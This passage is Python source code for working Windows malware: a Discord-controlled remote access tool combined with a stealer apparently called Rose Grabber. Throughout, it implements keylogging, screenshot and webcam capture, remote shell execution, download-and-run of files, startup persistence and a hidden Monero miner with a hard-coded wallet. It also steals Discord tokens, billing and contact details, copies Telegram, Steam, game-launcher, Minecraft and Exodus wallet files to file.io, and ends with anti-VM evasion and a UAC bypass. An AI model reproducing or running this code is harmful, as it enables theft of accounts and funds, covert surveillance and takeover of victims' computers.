            await ctx.send(f'Couldn\'t start keylogger for process {clientid} because of `{Exception}`.')
        
        with open(fname, 'w') as f:
            for keystroke in recorded:
                if keystroke.event_type == 'down':
                    if str('up') in str(keystroke):
                        str(keystroke).upper()
                    if str('down') in str(keystroke):
                        str(keystroke).lower()
                    f.write(str(f'''{keystroke}
'''.replace('KeyboardEvent', '').replace('(', '').replace(')', '').replace(' up', '').replace(' down', '')))
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Keylogger data file `{fname}` from process {clientid} was sent.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            kstring_random(15)
            record_time = duration
            fname = f'keylogger_finaldata_CLIENTID_{clientid}_{result_str}{duration}.txt'
            end_time = time.monotonic() + int(record_time)
            recorded = []
            try:
                await ctx.send(f'Started keylogger for process {clientid} with a duration of `{duration}` seconds without any problems. You will be notified in `{duration}` seconds, when the final data is being posted.')
                while True:
                    if time.monotonic() >= end_time:
                        break
                    recorded.append(keyboard.read_event())
            except KeyboardInterrupt:
                await ctx.send(f'Keylogger was killed by secret keystroke for process {clientid} because of `{Exception}`. Exe has been compiled without `--noconsole` probably.')
                pass
            except Exception:
                await ctx.send(f'Couldn\'t start keylogger for process {clientid} because of `{Exception}`.')
        
            with open(fname, 'w') as f:
                for keystroke in recorded:
                    if keystroke.event_type == 'down':
                        if str('up') in str(keystroke):
                            str(keystroke).upper()
                        if str('down') in str(keystroke):
                            str(keystroke).lower()
                        f.write(str(f'''{keystroke}
'''.replace('KeyboardEvent', '').replace('(', '').replace(')', '').replace(' up', '').replace(' down', '')))
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Keylogger data file `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='msgbox')
async def msgbox(ctx, inputid, title, msg):
    if inputid == clientid:
        MB_OK = 0x0
        ICON_EXCLAIM = 0x30
        try:
            ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
            await ctx.send(f'Successfully showed message box for process {clientid}.')
        except Exception:
            await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
    if inputid != clientid:
        if inputid == 'all':
            MB_OK = 0x0
            ICON_EXCLAIM = 0x30
            try:
                ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
                await ctx.send(f'Successfully showed message box for process {clientid}.')
            except Exception:
                await ctx.send(f'Couldn\'t show message box for process {clientid} because of `{Exception}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='screenshot')
async def screenshot(ctx, inputid):
    if inputid == clientid:
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        fname = f'screenshot_{clientid}.png'
        image.save(fname)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Screenshot `{fname}` from process {clientid} was sent.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            fname = f'screenshot_{clientid}.png'
            image.save(fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Screenshot `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
       
@bot.command(name='startup')
async def startup(ctx, inputid):
    if inputid == clientid:
        try:
            shutil.copy(argv[0], startup_loc)
            await ctx.send(f'Successfully copied file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
        except Exception:
            await ctx.send(f'Failed to copy file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
    if inputid != clientid:
        if inputid == 'all':
            try:
                shutil.copy(argv[0], startup_loc)
                await ctx.send(f'Successfully copied file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
            except Exception:
                await ctx.send(f'Failed to copy file `{argv[0]}` from process {clientid} to `{startup_loc}`.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='upload')
async def upload(ctx, inputid, dwnldlink, filetype):
    if inputid == clientid:
        kstring_random(5)
        async with aiohttp.ClientSession() as session:
            async with session.get(dwnldlink) as response:
                if response.status == 200:
                    content = await response.read()
                    fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
                    with open(fname, 'wb') as file:
                        file.write(content)
                    emojis = ['✅', '❌']
                    msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
                    for emoji in emojis:
                        await msg.add_reaction(emoji)
                    @bot.event
                    async def on_reaction_add(reaction, user):
                        emoji = reaction.emoji
                        if user.bot:
                            return
                        if emoji == '✅':
                            try:
                                os.system(fname)
                                await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
                            except Exception:
                                await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
                            return
                        elif emoji == '❌':
                            await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
                            return
                        else:
                            return
    if inputid != clientid:
        if inputid == 'all':
            kstring_random(5)
            async with aiohttp.ClientSession() as session:
                async with session.get(dwnldlink) as response:
                    if response.status == 200:
                        content = await response.read()
                        fname = f'filedwnldfrweb_CLIENTID_{clientid}_{result_str}{filetype}'
                        with open(fname, 'wb') as file:
                            file.write(content)
                        emojis = ['✅', '❌']
                        msg = await ctx.send(f'Downloaded file `{dwnldlink}` with the filetype `{filetype}` to process {clientid}. Should the file be executed directly?')
                        for emoji in emojis:
                            await msg.add_reaction(emoji)
                        @bot.event
                        async def on_reaction_add(reaction, user):
                            emoji = reaction.emoji
                            if user.bot:
                                return
                            if emoji == '✅':
                                try:
                                    os.system(fname)
                                    await ctx.send(f'Successfully executed scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid}.')
                                except Exception:
                                    await ctx.send(f'Couldn\'t execute scraped file `{dwnldlink}` with the filetype `{filetype}` for process {clientid} because of `{Exception}`.')
                                    return
                            elif emoji == '❌':
                                await ctx.send(f'Okay, scraped file `{dwnldlink}` with the filetype `{filetype}` is not going to be executed for process {clientid}.')
                                return
                            else:
                                return
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
                           
@bot.command(name='wallpaper')
async def wallpaper(ctx, inputid, rawimg):
    if inputid == clientid:
        r = requests.get(rawimg, allow_redirects=False)
        fname = f'newwallpaper_{clientid}.jpg'
        open(fname, 'wb').write(r.content)
        path = os.path.abspath(fname)
        ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
        await ctx.send(f'Changed background wallpaper for {clientid} to `{rawimg}`.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            r = requests.get(rawimg, allow_redirects=False)
            fname = f'newwallpaper_{clientid}.jpg'
            open(fname, 'wb').write(r.content)
            path = os.path.abspath(fname)
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
            await ctx.send(f'Changed background wallpaper for {clientid} to `{rawimg}`.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='webcam')
async def webcam(ctx, inputid):
    pygame.camera.init()
    if inputid == clientid:
        camlist = pygame.camera.list_cameras()
        fname = str(f'webcampicture_{clientid}.png')
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            pygame.image.save(image, fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Webcam picture `{fname}` from process {clientid} was sent.')
            os.remove(fname)
        else:
            await ctx.send(f'No camera was found for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            camlist = pygame.camera.list_cameras()
            fname = str(f'webcampicture_{clientid}.png')
            if camlist:
                cam = pygame.camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, fname)
                await ctx.send(file=discord.File(fname))
                await ctx.send(f'Webcam picture `{fname}` from process {clientid} was sent.')
                os.remove(fname)
            else:
                await ctx.send(f'No camera was found for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')

@bot.command(name='tasklist')
async def tasklist(ctx, inputid):
    if inputid == clientid:
        tasks = str(subprocess.check_output('tasklist', shell=True))
        fname = f'runningtasks_{clientid}.txt'
        with open(fname, 'w') as f:
            f.write(tasks)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Wrote all current tasks from process {clientid} to `{fname}`.')
        os.remove(fname)
    if inputid != clientid:
        if inputid == 'all':
            tasks = str(subprocess.check_output('tasklist', shell=True))
            fname = f'runningtasks_{clientid}.txt'
            with open(fname, 'w') as f:
                f.write(tasks)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Wrote all current tasks from process {clientid} to `{fname}`.')
            os.remove(fname)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='killprocess')
async def killprocess(ctx, inputid, procname):
    if inputid == clientid:
        subprocess.run(f'taskkill /f /im {procname}', shell=True)
        await ctx.send(f'Initiated to kill process `{procname}` for client {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'taskkill /f /im {procname}', shell=True)
            await ctx.send(f'Initiated to kill process `{procname}` for client {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='excshell')
async def shell(ctx, inputid, cmd):
    if inputid == clientid:
        subprocess.run(f'start cmd /f /c {cmd}', shell=True)
        await ctx.send(f'Executed cmd command `{cmd}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'start cmd /f /c {cmd}', shell=True)
            await ctx.send(f'Executed cmd command `{cmd}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='excpowershell')
async def powershell(ctx, inputid, shllcmd):
    if inputid == clientid:
        subprocess.run(f'start powershell /c {shllcmd}', shell=True)
        await ctx.send(f'Executed shell command `{shllcmd}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            subprocess.run(f'start powershell /c {shllcmd}', shell=True)
            await ctx.send(f'Executed shell command `{shllcmd}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='isadmin')
async def isadmin(ctx, inputid):
    if inputid == clientid:
        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
        if isadmin:
            await ctx.send(f'Process {clientid} **is** admin.')
        if not isadmin:
            await ctx.send(f'Process {clientid} **is not** admin.')
    if inputid != clientid:
        if inputid == 'all':
            isadmin = ctypes.windll.shell32.IsUserAnAdmin()
            if isadmin:
                await ctx.send(f'Process {clientid} **is** admin.')
            if not isadmin:
                await ctx.send(f'Process {clientid} **is not** admin.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='getadmin')
async def getadmin(ctx, inputid):
    if inputid == clientid:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        await ctx.send(f'Requested admin access for process {clientid}.')
        sys.exit(0)
    if inputid != clientid:
        if inputid == 'all':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            await ctx.send(f'Requested admin access for process {clientid}.')
            sys.exit(0)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='quit')
async def quit(ctx, inputid):
    if inputid == clientid:
        await ctx.send(f'Terminated Knight Remote Adminstration Tool for {clientid}.')
        sys.exit(0)
    if inputid != clientid:
        if inputid == 'all':
            await ctx.send(f'Terminated Knight Remote Adminstration Tool for {clientid}.')
            sys.exit(0)
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='clients')
async def clients(ctx):
    await ctx.send(f'{hostname} - {clientid}.')
    
@bot.command(name='browser')
async def browser(ctx, inputid, url):
    if inputid == clientid:
        webbrowser.open(url)
        await ctx.send(f'Opened webbrowser `{url}` for process {clientid}.')
    if inputid != clientid:
        if inputid == 'all':
            webbrowser.open(url)
            await ctx.send(f'Opened webbrowser `{url}` for process {clientid}.')
        if inputid != 'all' and clientid:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
def run_knight_rat():
    bot.run(btoken)

def xmrig():
    batch_code = """
@echo off

set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip

REM Generating a random directory name for installation
set "INSTALL_DIR=%USERPROFILE%\\Documents\\%RANDOM%\\%RANDOM%"

mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

powershell -command "& {{Invoke-WebRequest '%XMRIG_URL%' -OutFile 'xmrig.zip'}}"

powershell -command "& {{Expand-Archive -Path '.\\xmrig.zip' -DestinationPath '.'}}"

cd xmrig-6.21.0

echo @echo off > start_xmrig.bat
echo cd /d "%INSTALL_DIR%\\xmrig-6.21.0" >> start_xmrig.bat
echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u 49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu -p {} -a rx/0 -k --background >> start_xmrig.bat

echo move /y "start_xmrig.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" > move_to_startup.bat
call move_to_startup.bat
del move_to_startup.bat

cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
exit
""".format(get_random_string(12))

    batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")

    with open(batch_filepath, "w") as f:
        f.write(batch_code)

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    subprocess.Popen(
        ["cmd.exe", "/c", batch_filepath],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        startupinfo=startupinfo,
    )

class DiscordX():
    def __init__(self):
        self.webhook = cc.get_webhook()
        if cc.get_debug_mode:
            print("Discord Init")

    @staticmethod
    def GetUHQFriends(token):
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            friendlist = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/v6/users/@me/relationships",
                        headers=headers,
                    )).read().decode())
        except Exception:
            return False

        uhqlist = ""
        for friend in friendlist:
            OwnedBadges = ""
            flags = friend["user"]["public_flags"]
            for badge in badgeList:
                if flags // badge["Value"] != 0 and friend["type"] == 1:
                    if "House" not in badge["Name"]:
                        OwnedBadges += badge["Emoji"]
                    flags = flags % badge["Value"]
            if OwnedBadges != "":
                uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
        return uhqlist


    @staticmethod
    def GetBilling(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            billingjson = loads(
                urlopen(
                    Request(
                        "https://discord.com/api/users/@me/billing/payment-sources",
                        headers=headers,
                    )).read().decode())
        except Exception:
            return False

        if billingjson == []:
            return "`None`"

        billing = ""
        for methode in billingjson:
            if methode["invalid"] is False:
                if methode["type"] == 1:
                    billing += "<:credit_card:1151916484176654416>"
                elif methode["type"] == 2:
                    billing += "<:paypal:1151916071092244520> "

        return billing


    @staticmethod
    def GetBadge(flags):
        if flags == 0:
            return ""

        OwnedBadges = ""
        badgeList = [
            {
                "Name": "Early_Verified_Bot_Developer",
                "Value": 131072,
                "Emoji": "<:developer:874750808472825986> ",
            },
            {
                "Name": "Bug_Hunter_Level_2",
                "Value": 16384,
                "Emoji": "<:bughunter_2:874750808430874664> ",
            },
            {
                "Name": "Early_Supporter",
                "Value": 512,
                "Emoji": "<:early_supporter:874750808414113823> ",
            },
            {
                "Name": "House_Balance",
                "Value": 256,
                "Emoji": "<:balance:874750808267292683> ",
            },
            {
                "Name": "House_Brilliance",
                "Value": 128,
                "Emoji": "<:brilliance:874750808338608199> ",
            },
            {
                "Name": "House_Bravery",
                "Value": 64,
                "Emoji": "<:bravery:874750808388952075> ",
            },
            {
                "Name": "Bug_Hunter_Level_1",
                "Value": 8,
                "Emoji": "<:bughunter_1:874750808426692658> ",
            },
            {
                "Name": "HypeSquad_Events",
                "Value": 4,
                "Emoji": "<:hypesquad_events:874750808594477056> ",
            },
            {
                "Name": "Partnered_Server_Owner",
                "Value": 2,
                "Emoji": "<:partner:874750808678354964> ",
            },
            {
                "Name": "Discord_Employee",
                "Value": 1,
                "Emoji": "<:staff:874750808728666152> ",
            },
        ]
        for badge in badgeList:
            if flags // badge["Value"] != 0:
                OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]

        return OwnedBadges


    @staticmethod
    def GetTokenInfo(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }

        userjson = loads(
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers)).read().decode())
        username = userjson["username"]
        hashtag = userjson["discriminator"]
        email = userjson["email"]
        idd = userjson["id"]
        pfp = userjson["avatar"]
        flags = userjson["public_flags"]
        nitro = ""
        phone = "-"

        if "premium_type" in userjson:
            nitrot = userjson["premium_type"]
            if nitrot == 1:
                nitro = "<:classic:896119171019067423> "
            elif nitrot == 2:
                nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
        if "phone" in userjson:
            phone = userjson["phone"]

        return username, hashtag, email, idd, pfp, flags, nitro, phone


    @staticmethod
    def checkToken(token):
        headers = {
            "Authorization":
            token,
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        try:
            urlopen(
                Request("https://discordapp.com/api/v6/users/@me",
                        headers=headers))
            return True
        except Exception:
            return False


    def uploadToken(self, token):
        global hook
        headers = {
            "Content-Type":
            "application/json",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)

        if pfp is None:
            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
        else:
            pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

        billing = self.GetBilling(token)
        badge = self.GetBadge(flags)
        friends = self.GetUHQFriends(token)
        if friends == "":
            friends = "`None`"
        if not billing:
            badge, phone, billing = "None", "None", "None"
        if nitro == "" and badge == "":
            nitro = "`None`"

        current_time_iso = datetime.now().isoformat()
        data = {
            "content":
            "",
            "embeds": [{
                "title":
                "Rose Report",
                "description":
                "Rose Instance - Token Information",
                "color":
                cc.get_color(),
                "fields": [
                    {
                        "name": "Token:",
                        "value": f"||`{token}`||",
                        "inline": False,
                    },
                    {
                        "name": "Email:",
                        "value": f"`{email}`",
                        "inline": False,
                    },
                    {
                        "name": "Phone:",
                        "value": f"`{phone}`",
                        "inline": False,
                    },
                    {
                        "name": "Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": False,
                    },
                    {
                        "name": "Billing:",
                        "value": f"{billing}",
                        "inline": False,
                    },
                    {
                        "name": "Friends:",
                        "value": f"{friends}",
                        "inline": False,
                    },
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}",
                },
                "footer": {
                    "text": cc.get_footer(),
                    "icon_url": cc.get_avatar(),
                },
                "thumbnail": {
                    "url": f"{pfp}"
                },
                "timestamp": current_time_iso,
            }],
            "avatar_url":
            cc.wh_avatar,
            "username":
            cc.wh_name,
            "attachments": [],
        }
        urlopen(Request(self.webhook, data=dumps(data).encode(), headers=headers))

class get_games():
    def __init__(self):
        self.cc = Config()

        self.webx = _WebhookX().get_object()

        self.embed = Embed(
            title='Rose Report',
            description='Rose Instance - Games and Application Grabber',
            color=self.cc.get_color(),
            timestamp=datetime.now().isoformat()
        )

        self.embed.set_author(name=self.cc.get_name(), icon_url=self.cc.get_avatar())
        self.embed.set_footer(text=self.cc.get_footer(), icon_url=self.cc.get_avatar())

        self.userProfile = os.getenv("userprofile")
        self.roaming = os.getenv("appdata")
        self.tdata_path = os.path.join(self.roaming, 'Telegram Desktop', 'tdata')
        self.uplay_launcher_path = os.path.join(self.roaming, 'Ubisoft Game Launcher')
        self.epic_games_path = os.path.join(self.roaming, 'EpicGamesLauncher', 'Saved')
        self.steam_path = r'C:\Program Files (x86)\Steam\config'
        self.exodus_path = os.path.join(self.roaming, 'Exodus', 'exodus.wallet')
        self.minecraftPaths = {
                "Intent": os.path.join(self.userProfile, "intentlauncher", "launcherconfig"),
                "Lunar": os.path.join(self.userProfile, ".lunarclient", "settings", "game", "accounts.json"),
                "TLauncher": os.path.join(self.roaming, ".minecraft", "TlauncherProfiles.json"),
                "Feather": os.path.join(self.roaming, ".feather", "accounts.json"),
                "Meteor": os.path.join(self.roaming, ".minecraft", "meteor-client", "accounts.nbt"),
                "Impact": os.path.join(self.roaming, ".minecraft", "Impact", "alts.json"),
                "Novoline": os.path.join(self.roaming, ".minectaft", "Novoline", "alts.novo"),
                "CheatBreakers": os.path.join(self.roaming, ".minecraft", "cheatbreaker_accounts.json"),
                "Microsoft Store": os.path.join(self.roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
                "Rise": os.path.join(self.roaming, ".minecraft", "Rise", "alts.txt"),
                "Rise (Intent)": os.path.join(self.userProfile, "intentlauncher", "Rise", "alts.txt"),
                "Paladium": os.path.join(self.roaming, "paladium-group", "accounts.json"),
                "PolyMC": os.path.join(self.roaming, "PolyMC", "accounts.json"),
                "Badlion": os.path.join(self.roaming, "Badlion Client", "accounts.json"),
            }
        self.rose_path = os.path.join(self.roaming, 'roseontop')
        self.telegram_folder = os.path.join(self.rose_path, 'Telegram')
        self.steam_folder = os.path.join(self.rose_path, 'Steam')
        self.uplay_folder = os.path.join(self.rose_path, 'Uplay')
        self.minecraft_folder = os.path.join(self.rose_path, 'Minecraft')
        self.epic_games_folder = os.path.join(self.rose_path, 'Epic Games')
        self.exodus_folder = os.path.join(self.rose_path, 'Exodus')
        self.games_zip = os.path.join(self.rose_path, 'Games.zip')

    def get_games(self):
        if not os.path.exists(self.tdata_path):
            self.telegram_check = True
        else:
            self.telegram_check = False
        
        if os.path.exists(self.telegram_folder):
            shutil.rmtree(self.telegram_folder)    
            
        if os.path.exists(self.tdata_path):
            try:
                shutil.copytree(self.tdata_path, self.telegram_folder)
            except Exception:
                self.telegram_check = True
                pass

        if not os.path.exists(self.epic_games_path):
            self.epic_games_check = True
        else:
            self.epic_games_check = False
        
        if os.path.exists(self.epic_games_folder):
            shutil.rmtree(self.epic_games_folder)    
            
        if os.path.exists(self.epic_games_path):
            try:
                shutil.copytree(self.epic_games_path, self.epic_games_folder)
            except Exception:
                self.epic_games_check = True
                pass

        if not os.path.exists(self.steam_path):
            self.steam_check = True
        else:
            self.steam_check = False
        
        if os.path.exists(self.steam_folder):
            shutil.rmtree(self.steam_folder)    
            
        if os.path.exists(self.steam_path):
            try:
                shutil.copytree(self.steam_path, self.steam_folder)
            except Exception:
                self.steam_check = True
                pass

        if not os.path.exists(self.uplay_launcher_path):
            self.uplay_check = True
        else:
            self.uplay_check = False
        
        if os.path.exists(self.uplay_folder):
            shutil.rmtree(self.uplay_folder)    
            
        if os.path.exists(self.uplay_launcher_path):
            try:
                shutil.copytree(self.uplay_launcher_path, self.uplay_folder)
            except Exception:
                self.uplay_check = True
                pass
       
        if not os.path.exists(self.exodus_path):
            self.exodus_check = True
        else:
            self.exodus_check = False
        
        if os.path.exists(self.exodus_folder):
            shutil.rmtree(self.exodus_folder)    
            
        if os.path.exists(self.exodus_path):
            try:
                shutil.copytree(self.exodus_path, self.exodus_folder)
            except Exception:
                self.exodus_check = True
                pass

        if os.path.exists(self.minecraft_folder):
            shutil.rmtree(self.minecraft_folder)
        
        self.minecraft_check = True
        for self.minecraftPath in self.minecraftPaths.values():
            if os.path.exists(self.minecraftPath):
                self.minecraft_check = False
                try:
                    print(os.path.basename(os.path.dirname(self.minecraftPath)))
                    print(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                    if not os.path.exists(self.minecraft_folder):
                        os.mkdir(self.minecraft_folder)
                    if not os.path.exists(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath)))):
                        os.mkdir(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                    shutil.copy(self.minecraftPath, os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                except Exception as e:
                    pass

        if (not self.epic_games_check or not self.steam_check or not self.uplay_check or not self.telegram_check or not self.minecraft_check or not self.exodus_check):
            if not os.path.exists(self.games_zip):
                with zipfile.ZipFile(self.games_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
                    if not self.telegram_check:
                        for root, dirs, files in os.walk(self.telegram_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.telegram_folder)
                                arcname = os.path.join("Telegram", arcname)
                                zf.write(file_path, arcname)

                    if not self.epic_games_check:
                        for root, dirs, files in os.walk(self.epic_games_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.epic_games_folder)
                                arcname = os.path.join("Epic Games", arcname)
                                zf.write(file_path, arcname)

                    if not self.steam_check:
                        for root, dirs, files in os.walk(self.steam_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.steam_folder)
                                arcname = os.path.join("Steam", arcname)
                                zf.write(file_path, arcname)

                    if not self.uplay_check:
                        for root, dirs, files in os.walk(self.uplay_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.uplay_folder)
                                arcname = os.path.join("Uplay", arcname)
                                zf.write(file_path, arcname)

                    if not self.exodus_check:
                        for root, dirs, files in os.walk(self.exodus_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.exodus_folder)
                                arcname = os.path.join("Exodus", arcname)
                                zf.write(file_path, arcname)

                    if not self.minecraft_check:
                        for root, dirs, files in os.walk(self.minecraft_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.minecraft_folder)
                                arcname = os.path.join("Minecraft", arcname)
                                zf.write(file_path, arcname)

            upload_url = "https://file.io"
            files = {"file": (self.games_zip, open(self.games_zip, "rb"))}
            response = requests.post(upload_url, files=files)

            if response.status_code == 200:
                self.download_link = response.json().get("link", "Unknown")
            else:
                self.download_link = "Unknown"
        
            self.embed.add_field(name='Games', value=f'[Download]({self.download_link})', inline=False)

            self.webx.send(embed=self.embed)

if cc.get_antivm():
    try:
        if user_check():
            os._exit(1)
        if hwid_check():
            os._exit(1)
        if ip_check():
            os._exit(1)
        if registry_check():
            os._exit(1)
        if dll_check():
            os._exit(1)
        if specs_check():
            os._exit(1)
        if proc_check():
            os._exit(1)
        if mac_check():
            os._exit(1)
        process_check()
    except Exception as e:
        send_error_notification(e, 'Rose Anti-VM')

if cc.get_uac_bypass():
    try:
        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass():
                    os._exit(1)
                else:
                    param = " ".join(sys.argv)
                    if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, param, None, 1) > 32:
                        os._exit(0)
    except Exception as e:
        send_error_notification(e, 'Rose UAC Bypass')

